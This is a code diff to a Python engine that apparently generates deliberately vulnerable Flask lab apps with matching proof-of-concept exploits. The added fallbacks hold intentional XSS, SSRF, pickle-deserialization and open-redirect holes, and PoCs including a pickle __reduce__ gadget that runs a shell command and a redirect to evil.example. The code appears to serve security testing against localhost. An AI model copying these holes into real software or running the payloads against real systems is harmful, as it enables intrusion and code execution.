@@ -173,6 +173,7 @@ class CandidateReport:
     static_report: Dict[str, Any]
     guard_report: Dict[str, Any] | None = None
     fallback_used: bool = False
+    fallback_class: str = ""
     family_override_applied: bool = False
     llm_stub_used: bool = False
     llm_failure_class: str = ""
@@ -198,6 +199,7 @@ class CandidateReport:
             "static_report": self.static_report,
             "dep_guard": self.guard_report or {},
             "fallback_used": self.fallback_used,
+            "fallback_class": self.fallback_class,
             "family_override_applied": self.family_override_applied,
             "llm_stub_used": self.llm_stub_used,
             "llm_failure_class": self.llm_failure_class,
@@ -319,6 +321,7 @@ class SynthesisEngine:
             raw = self.llm.generate(messages)
             manifest = self._parse_manifest(raw, idx)
             fallback_used = self._manifest_uses_deterministic_fallback(manifest)
+            fallback_class = self._manifest_fallback_class(manifest)
             manifest = self._apply_poc_template(manifest, poc_template)
             manifest = self._ensure_fallback_poc(manifest, poc_template)
             before_family_override = json.dumps(manifest, sort_keys=True, ensure_ascii=False)
@@ -357,6 +360,7 @@ class SynthesisEngine:
                     static_report=static_report,
                     guard_report=guard_report,
                     fallback_used=fallback_used,
+                    fallback_class=fallback_class,
                     family_override_applied=family_override_applied,
                     llm_stub_used=bool(getattr(self.llm, "use_stub", False)),
                     llm_failure_class=str(getattr(self.llm, "last_error_class", "") or ""),
@@ -670,6 +674,7 @@ class SynthesisEngine:
         route_candidates = self._template_injection_route_candidates(manifest)
         payload_prefix = flag_token or "SSTI_OK"
         default_payload = f"{payload_prefix} {{{{7*7}}}}"
+        default_base = self._default_base_url_for_manifest(manifest, fallback_port=5000)
         lines = [
             "import argparse",
             "import sys",
@@ -688,7 +693,7 @@ class SynthesisEngine:
             "",
             "def main() -> int:",
             "    ap = argparse.ArgumentParser()",
-            "    ap.add_argument('--base-url', default='http://127.0.0.1:5000')",
+            f"    ap.add_argument('--base-url', default={default_base!r})",
             "    ap.add_argument('--payload', default=DEFAULT_PAYLOAD)",
             "    args = ap.parse_args()",
             "    base = args.base_url.rstrip('/')",
@@ -715,6 +720,20 @@ class SynthesisEngine:
             "",
         ]
         return "\n".join(lines)
+
+    @staticmethod
+    def _default_base_url_for_manifest(manifest: Dict[str, Any], *, fallback_port: int = 5000) -> str:
+        port = fallback_port
+        if isinstance(manifest, dict):
+            run = manifest.get("run")
+            if isinstance(run, dict):
+                try:
+                    candidate = int(run.get("port") or fallback_port)
+                except Exception:
+                    candidate = fallback_port
+                if candidate > 0:
+                    port = candidate
+        return f"http://127.0.0.1:{port}"
 
     def _parse_manifest(self, raw: str, idx: int) -> Dict[str, Any]:
         try:
@@ -750,6 +769,17 @@ class SynthesisEngine:
             if origin == "deterministic_fallback":
                 return True
         return False
+
+    @staticmethod
+    def _manifest_fallback_class(manifest: Dict[str, Any]) -> str:
+        if not isinstance(manifest, dict):
+            return ""
+        metadata = manifest.get("metadata")
+        if isinstance(metadata, dict):
+            value = str(metadata.get("fallback_class") or "").strip()
+            if value:
+                return value
+        return ""
 
     @staticmethod
     def _normalize_manifest_roles(manifest: Dict[str, Any]) -> Dict[str, Any]:
@@ -801,8 +831,48 @@ class SynthesisEngine:
                 success_signature=success_signature,
                 flag_token=flag_token,
             )
+        if self._is_ssrf_family():
+            return self._fallback_manifest_ssrf(
+                vuln_id=str(vuln_id),
+                normalized_vuln=normalized_vuln,
+                stack=str(stack),
+                port=port,
+                notes=notes,
+                success_signature=success_signature,
+                flag_token=flag_token,
+            )
+        if self._is_xss_family():
+            return self._fallback_manifest_xss(
+                vuln_id=str(vuln_id),
+                normalized_vuln=normalized_vuln,
+                stack=str(stack),
+                port=port,
+                notes=notes,
+                success_signature=success_signature,
+                flag_token=flag_token,
+            )
+        if self._is_deserialization_family():
+            return self._fallback_manifest_deserialization(
+                vuln_id=str(vuln_id),
+                normalized_vuln=normalized_vuln,
+                stack=str(stack),
+                port=port,
+                notes=notes,
+                success_signature=success_signature,
+                flag_token=flag_token,
+            )
         if self._is_template_injection_family():
             return self._fallback_manifest_template_injection(
+                vuln_id=str(vuln_id),
+                normalized_vuln=normalized_vuln,
+                stack=str(stack),
+                port=port,
+                notes=notes,
+                success_signature=success_signature,
+                flag_token=flag_token,
+            )
+        if self._is_open_redirect_family():
+            return self._fallback_manifest_open_redirect(
                 vuln_id=str(vuln_id),
                 normalized_vuln=normalized_vuln,
                 stack=str(stack),
@@ -939,6 +1009,7 @@ class SynthesisEngine:
                 "stack": stack,
                 "cwe": vuln_id,
                 "generation_origin": "deterministic_fallback",
+                "fallback_class": "generic_unsupported_family",
             },
         }
 
@@ -954,11 +1025,49 @@ class SynthesisEngine:
         label = str((self._requirement or {}).get("vuln_name") or (self._requirement or {}).get("vuln_label") or "").strip().lower()
         return vuln == "cwe-352" or "csrf" in pattern_id or "csrf" in label or "cross-site request forgery" in label
 
+    def _is_xss_family(self) -> bool:
+        vuln = normalize_vuln_id(str((self._requirement or {}).get("vuln_id") or ""))
+        pattern_id = str((self._requirement or {}).get("pattern_id") or "").strip().lower()
+        label = str((self._requirement or {}).get("vuln_name") or (self._requirement or {}).get("vuln_label") or "").strip().lower()
+        return vuln == "cwe-79" or "xss" in pattern_id or "cross-site scripting" in label or label == "xss"
+
+    def _is_ssrf_family(self) -> bool:
+        vuln = normalize_vuln_id(str((self._requirement or {}).get("vuln_id") or ""))
+        pattern_id = str((self._requirement or {}).get("pattern_id") or "").strip().lower()
+        label = str((self._requirement or {}).get("vuln_name") or (self._requirement or {}).get("vuln_label") or "").strip().lower()
+        return (
+            vuln == "cwe-918"
+            or "ssrf" in pattern_id
+            or "server-side request forgery" in label
+            or label == "ssrf"
+        )
+
+    def _is_deserialization_family(self) -> bool:
+        vuln = normalize_vuln_id(str((self._requirement or {}).get("vuln_id") or ""))
+        pattern_id = str((self._requirement or {}).get("pattern_id") or "").strip().lower()
+        label = str((self._requirement or {}).get("vuln_name") or (self._requirement or {}).get("vuln_label") or "").strip().lower()
+        return (
+            vuln == "cwe-502"
+            or "deserialization" in pattern_id
+            or "deserialization" in label
+        )
+
     def _is_path_traversal_family(self) -> bool:
         vuln = normalize_vuln_id(str((self._requirement or {}).get("vuln_id") or ""))
         pattern_id = str((self._requirement or {}).get("pattern_id") or "").strip().lower()
         label = str((self._requirement or {}).get("vuln_name") or (self._requirement or {}).get("vuln_label") or "").strip().lower()
         return vuln == "cwe-22" or "path-traversal" in pattern_id or "path traversal" in label or "directory traversal" in label
+
+    def _is_open_redirect_family(self) -> bool:
+        vuln = str((self._requirement or {}).get("vuln_id") or "").strip().lower()
+        pattern_id = str((self._requirement or {}).get("pattern_id") or "").strip().lower()
+        label = str((self._requirement or {}).get("vuln_name") or (self._requirement or {}).get("vuln_label") or "").strip().lower()
+        return (
+            "open-redirect" in pattern_id
+            or "open redirect" in label
+            or "unvalidated redirect" in label
+            or vuln in {"name-open-redirect", "name_open_redirect"}
+        )
 
     def _fallback_pattern_tags(self, vuln_id: str) -> List[str]:
         tags = {"fallback", "stub", str(vuln_id or "").strip().lower()}
@@ -1055,6 +1164,7 @@ class SynthesisEngine:
                 "stack": stack,
                 "cwe": vuln_id,
                 "generation_origin": "deterministic_fallback",
+                "fallback_class": "family_aware",
             },
         }
 
@@ -1282,6 +1392,313 @@ class SynthesisEngine:
             requirements_content="Flask==3.0.0\nrequests==2.31.0\n",
             app_content=app_content,
             poc_content=None,
+        )
+
+    def _fallback_manifest_xss(
+        self,
+        *,
+        vuln_id: str,
+        normalized_vuln: str,
+        stack: str,
+        port: int,
+        notes: str,
+        success_signature: str,
+        flag_token: str,
+    ) -> Dict[str, Any]:
+        app_content = (
+            "from flask import Flask, render_template_string, request\n\n"
+            "app = Flask(__name__)\n\n"
+            "@app.get('/health')\n"
+            "def health():\n"
+            "    return {'ok': True}\n\n"
+            "@app.get('/search')\n"
+            "def search():\n"
+            "    # Reflected cross-site scripting: unescaped reflection of <script> payloads into a template response.\n"
+            "    name = request.args.get('name', 'Guest')\n"
+            "    template = \"<div class='result'>\" + name + \"</div>\"\n"
+            "    return render_template_string(template)\n\n"
+            "if __name__ == '__main__':\n"
+            f"    app.run(host='0.0.0.0', port={port})\n"
+        )
+        poc_content = (
+            "import argparse\n"
+            "import sys\n"
+            "from urllib.error import HTTPError, URLError\n"
+            "from urllib.parse import quote\n"
+            "from urllib.request import urlopen\n\n"
+            f"SUCCESS_SIGNATURE = {success_signature!r}\n"
+            f"FLAG_TOKEN = {flag_token!r}\n"
+            "DEFAULT_PAYLOAD = '<script>alert(1)</script>'\n\n"
+            "def exploit(base_url: str, payload: str) -> bool:\n"
+            "    url = base_url.rstrip('/') + '/search?name=' + quote(payload)\n"
+            "    try:\n"
+            "        with urlopen(url, timeout=5) as resp:\n"
+            "            body = resp.read().decode('utf-8', errors='ignore')\n"
+            "    except (HTTPError, URLError) as exc:\n"
+            "        print(f'[xss-fallback] request failed: {exc}', file=sys.stderr)\n"
+            "        return False\n"
+            "    return payload in body\n\n"
+            "def main() -> None:\n"
+            "    parser = argparse.ArgumentParser(description='XSS fallback PoC')\n"
+            f"    parser.add_argument('--base-url', default='http://127.0.0.1:{port}')\n"
+            "    parser.add_argument('--payload', default=DEFAULT_PAYLOAD)\n"
+            "    args = parser.parse_args()\n"
+            "    if exploit(args.base_url, args.payload):\n"
+            "        print(SUCCESS_SIGNATURE)\n"
+            "        if FLAG_TOKEN:\n"
+            "            print(FLAG_TOKEN)\n"
+            "        raise SystemExit(0)\n"
+            "    print('[xss-fallback] exploit did not succeed', file=sys.stderr)\n"
+            "    raise SystemExit(1)\n\n"
+            "if __name__ == '__main__':\n"
+            "    main()\n"
+        )
+        return self._fallback_manifest_from_parts(
+            vuln_id=normalized_vuln or vuln_id,
+            stack=stack,
+            port=port,
+            notes=notes,
+            success_signature=success_signature,
+            flag_token=flag_token,
+            requirements_content="Flask==3.0.0\n",
+            app_content=app_content,
+            poc_content=poc_content,
+        )
+
+    def _fallback_manifest_ssrf(
+        self,
+        *,
+        vuln_id: str,
+        normalized_vuln: str,
+        stack: str,
+        port: int,
+        notes: str,
+        success_signature: str,
+        flag_token: str,
+    ) -> Dict[str, Any]:
+        effective_flag = flag_token or "FLAG{SSRF_OK}"
+        app_content = (
+            "import requests\n"
+            "from flask import Flask, jsonify, request\n\n"
+            "app = Flask(__name__)\n\n"
+            "@app.get('/health')\n"
+            "def health():\n"
+            "    return {'ok': True}\n\n"
+            "@app.get('/metadata')\n"
+            "def metadata():\n"
+            f"    return jsonify({{'flag': {effective_flag!r}, 'service': 'metadata'}})\n\n"
+            "@app.get('/fetch')\n"
+            "def fetch():\n"
+            "    # server-side request forgery: user-controlled url reaches requests.get\n"
+            "    target_url = request.args.get('url', 'http://127.0.0.1:8000/metadata')\n"
+            "    resp = requests.get(target_url, timeout=2)\n"
+            "    return resp.text, resp.status_code, {'Content-Type': resp.headers.get('Content-Type', 'text/plain')}\n\n"
+            "if __name__ == '__main__':\n"
+            f"    app.run(host='0.0.0.0', port={port})\n"
+        )
+        poc_content = (
+            "import argparse\n"
+            "import json\n"
+            "import sys\n"
+            "from urllib.error import HTTPError, URLError\n"
+            "from urllib.parse import quote\n"
+            "from urllib.request import urlopen\n\n"
+            f"SUCCESS_SIGNATURE = {success_signature!r}\n"
+            f"FLAG_TOKEN = {effective_flag!r}\n"
+            "DEFAULT_TARGET = 'http://127.0.0.1:8000/metadata'\n\n"
+            "def exploit(base_url: str, target: str) -> bool:\n"
+            "    url = base_url.rstrip('/') + '/fetch?url=' + quote(target, safe=':/?=&')\n"
+            "    try:\n"
+            "        with urlopen(url, timeout=5) as resp:\n"
+            "            body = resp.read().decode('utf-8', errors='ignore')\n"
+            "    except (HTTPError, URLError) as exc:\n"
+            "        print(f'[ssrf-fallback] request failed: {exc}', file=sys.stderr)\n"
+            "        return False\n"
+            "    try:\n"
+            "        payload = json.loads(body)\n"
+            "    except json.JSONDecodeError:\n"
+            "        return False\n"
+            "    return str(payload.get('flag')) == FLAG_TOKEN\n\n"
+            "def main() -> None:\n"
+            "    parser = argparse.ArgumentParser(description='SSRF fallback PoC')\n"
+            f"    parser.add_argument('--base-url', default='http://127.0.0.1:{port}')\n"
+            "    parser.add_argument('--payload', default=DEFAULT_TARGET)\n"
+            "    args = parser.parse_args()\n"
+            "    if exploit(args.base_url, args.payload):\n"
+            "        print(SUCCESS_SIGNATURE)\n"
+            "        print(FLAG_TOKEN)\n"
+            "        raise SystemExit(0)\n"
+            "    print('[ssrf-fallback] exploit did not succeed', file=sys.stderr)\n"
+            "    raise SystemExit(1)\n\n"
+            "if __name__ == '__main__':\n"
+            "    main()\n"
+        )
+        return self._fallback_manifest_from_parts(
+            vuln_id=normalized_vuln or vuln_id,
+            stack=stack,
+            port=port,
+            notes=notes,
+            success_signature=success_signature,
+            flag_token=effective_flag,
+            requirements_content="Flask==3.0.0\nrequests==2.31.0\n",
+            app_content=app_content,
+            poc_content=poc_content,
+        )
+
+    def _fallback_manifest_deserialization(
+        self,
+        *,
+        vuln_id: str,
+        normalized_vuln: str,
+        stack: str,
+        port: int,
+        notes: str,
+        success_signature: str,
+        flag_token: str,
+    ) -> Dict[str, Any]:
+        effective_flag = flag_token or "FLAG{DESER_OK}"
+        app_content = (
+            "from pathlib import Path\n"
+            "import pickle\n"
+            "from flask import Flask, jsonify, request\n\n"
+            "app = Flask(__name__)\n"
+            "FLAG_PATH = Path('/tmp/deser-flag.txt')\n"
+            f"FLAG_VALUE = {effective_flag!r}\n\n"
+            "@app.get('/health')\n"
+            "def health():\n"
+            "    return {'ok': True}\n\n"
+            "@app.post('/deserialize')\n"
+            "def deserialize_payload():\n"
+            "    # insecure deserialization of attacker-controlled serialized payload.\n"
+            "    payload = request.get_data()\n"
+            "    result = pickle.loads(payload)\n"
+            "    return jsonify({'result': str(result)})\n\n"
+            "def init_runtime_state() -> None:\n"
+            "    FLAG_PATH.write_text(FLAG_VALUE, encoding='utf-8')\n\n"
+            "if __name__ == '__main__':\n"
+            "    init_runtime_state()\n"
+            f"    app.run(host='0.0.0.0', port={port})\n"
+        )
+        poc_content = (
+            "import argparse\n"
+            "import json\n"
+            "import pickle\n"
+            "import sys\n"
+            "from urllib.error import HTTPError, URLError\n"
+            "from urllib.request import Request, urlopen\n\n"
+            f"SUCCESS_SIGNATURE = {success_signature!r}\n"
+            f"FLAG_TOKEN = {effective_flag!r}\n\n"
+            "class Exploit:\n"
+            "    def __reduce__(self):\n"
+            "        import subprocess\n"
+            "        return (subprocess.getoutput, ('cat /tmp/deser-flag.txt',))\n\n"
+            "def exploit(base_url: str) -> bool:\n"
+            "    target = base_url.rstrip('/') + '/deserialize'\n"
+            "    payload = pickle.dumps(Exploit(), protocol=pickle.HIGHEST_PROTOCOL)\n"
+            "    request_obj = Request(target, data=payload, method='POST')\n"
+            "    request_obj.add_header('Content-Type', 'application/octet-stream')\n"
+            "    try:\n"
+            "        with urlopen(request_obj, timeout=5) as resp:\n"
+            "            body = resp.read().decode('utf-8', errors='ignore')\n"
+            "    except (HTTPError, URLError) as exc:\n"
+            "        print(f'[deser-fallback] request failed: {exc}', file=sys.stderr)\n"
+            "        return False\n"
+            "    try:\n"
+            "        payload = json.loads(body)\n"
+            "    except json.JSONDecodeError:\n"
+            "        return False\n"
+            "    return str(payload.get('result')) == FLAG_TOKEN\n\n"
+            "def main() -> None:\n"
+            "    parser = argparse.ArgumentParser(description='Deserialization fallback PoC')\n"
+            f"    parser.add_argument('--base-url', default='http://127.0.0.1:{port}')\n"
+            "    args = parser.parse_args()\n"
+            "    if exploit(args.base_url):\n"
+            "        print(SUCCESS_SIGNATURE)\n"
+            "        print(FLAG_TOKEN)\n"
+            "        raise SystemExit(0)\n"
+            "    print('[deser-fallback] exploit did not succeed', file=sys.stderr)\n"
+            "    raise SystemExit(1)\n\n"
+            "if __name__ == '__main__':\n"
+            "    main()\n"
+        )
+        return self._fallback_manifest_from_parts(
+            vuln_id=normalized_vuln or vuln_id,
+            stack=stack,
+            port=port,
+            notes=notes,
+            success_signature=success_signature,
+            flag_token=effective_flag,
+            requirements_content="Flask==3.0.0\n",
+            app_content=app_content,
+            poc_content=poc_content,
+        )
+
+    def _fallback_manifest_open_redirect(
+        self,
+        *,
+        vuln_id: str,
+        normalized_vuln: str,
+        stack: str,
+        port: int,
+        notes: str,
+        success_signature: str,
+        flag_token: str,
+    ) -> Dict[str, Any]:
+        app_content = (
+            "from flask import Flask, redirect, request\n\n"
+            "app = Flask(__name__)\n\n"
+            "@app.get('/health')\n"
+            "def health():\n"
+            "    return {'ok': True}\n\n"
+            "@app.get('/go')\n"
+            "def go():\n"
+            "    # Open redirect via unvalidated redirect target supplied by the next parameter.\n"
+            "    next_url = request.args.get('next', 'https://example.com')\n"
+            "    return redirect(next_url, code=302)\n\n"
+            "if __name__ == '__main__':\n"
+            f"    app.run(host='0.0.0.0', port={port})\n"
+        )
+        poc_content = (
+            "import argparse\n"
+            "import sys\n"
+            "import requests\n\n"
+            f"SUCCESS_SIGNATURE = {success_signature!r}\n"
+            f"FLAG_TOKEN = {flag_token!r}\n"
+            "DEFAULT_TARGET = 'https://evil.example/landing'\n\n"
+            "def exploit(base_url: str, target: str) -> bool:\n"
+            "    url = base_url.rstrip('/') + '/go'\n"
+            "    try:\n"
+            "        resp = requests.get(url, params={'next': target}, timeout=5, allow_redirects=False)\n"
+            "    except requests.RequestException as exc:\n"
+            "        print(f'[open-redirect-fallback] request failed: {exc}', file=sys.stderr)\n"
+            "        return False\n"
+            "    location = resp.headers.get('Location', '')\n"
+            "    return resp.status_code in {301, 302, 303, 307, 308} and location == target\n\n"
+            "def main() -> None:\n"
+            "    parser = argparse.ArgumentParser(description='Open Redirect fallback PoC')\n"
+            f"    parser.add_argument('--base-url', default='http://127.0.0.1:{port}')\n"
+            "    parser.add_argument('--payload', default=DEFAULT_TARGET)\n"
+            "    args = parser.parse_args()\n"
+            "    if exploit(args.base_url, args.payload):\n"
+            "        print(SUCCESS_SIGNATURE)\n"
+            "        if FLAG_TOKEN:\n"
+            "            print(FLAG_TOKEN)\n"
+            "        raise SystemExit(0)\n"
+            "    print('[open-redirect-fallback] exploit did not succeed', file=sys.stderr)\n"
+            "    raise SystemExit(1)\n\n"
+            "if __name__ == '__main__':\n"
+            "    main()\n"
+        )
+        return self._fallback_manifest_from_parts(
+            vuln_id=vuln_id,
+            stack=stack,
+            port=port,
+            notes=notes,
+            success_signature=success_signature,
+            flag_token=flag_token,
+            requirements_content="Flask==3.0.0\nrequests==2.31.0\n",
+            app_content=app_content,
+            poc_content=poc_content,
         )
 
     def _fallback_manifest_path_traversal(
@@ -2067,6 +2484,7 @@ class SynthesisEngine:
             "guard_policy": self._guard_engine.policy_snapshot if isinstance(self._guard_engine, GuardEngine) else {},
             "generation_origin": generation_origin,
             "fallback_used": selected.fallback_used,
+            "fallback_class": selected.fallback_class or None,
             "family_override_applied": selected.family_override_applied,
             "llm_stub_used": selected.llm_stub_used,
             "llm_failure_class": selected.llm_failure_class,
@@ -2074,6 +2492,7 @@ class SynthesisEngine:
             "provenance": {
                 "generation_origin": generation_origin,
                 "fallback_used": selected.fallback_used,
+                "fallback_class": selected.fallback_class or None,
                 "family_override_applied": selected.family_override_applied,
                 "llm_stub_used": selected.llm_stub_used,
             },
@@ -2096,6 +2515,7 @@ class SynthesisEngine:
         autofix_trace: List[Dict[str, Any]] = []
         llm_stub_used = False
         fallback_used = False
+        fallback_class = ""
         family_override_applied = False
         llm_failure_class = ""
         llm_failure_message = ""
@@ -2119,6 +2539,8 @@ class SynthesisEngine:
                 autofix_trace.extend(trace_entries)
             llm_stub_used = llm_stub_used or bool(report.llm_stub_used)
             fallback_used = fallback_used or bool(report.fallback_used)
+            if not fallback_class and isinstance(report.fallback_class, str) and report.fallback_class.strip():
+                fallback_class = report.fallback_class.strip()
             family_override_applied = family_override_applied or bool(report.family_override_applied)
             if not llm_failure_class and isinstance(report.llm_failure_class, str) and report.llm_failure_class.strip():
                 llm_failure_class = report.llm_failure_class.strip()
@@ -2282,6 +2704,7 @@ class SynthesisEngine:
             "autofix_trace": autofix_trace,
             "llm_stub_used": llm_stub_used,
             "fallback_used": fallback_used,
+            "fallback_class": fallback_class or None,
             "family_override_applied": family_override_applied,
             "llm_failure_class": llm_failure_class or None,
             "llm_failure_message": llm_failure_message or None,
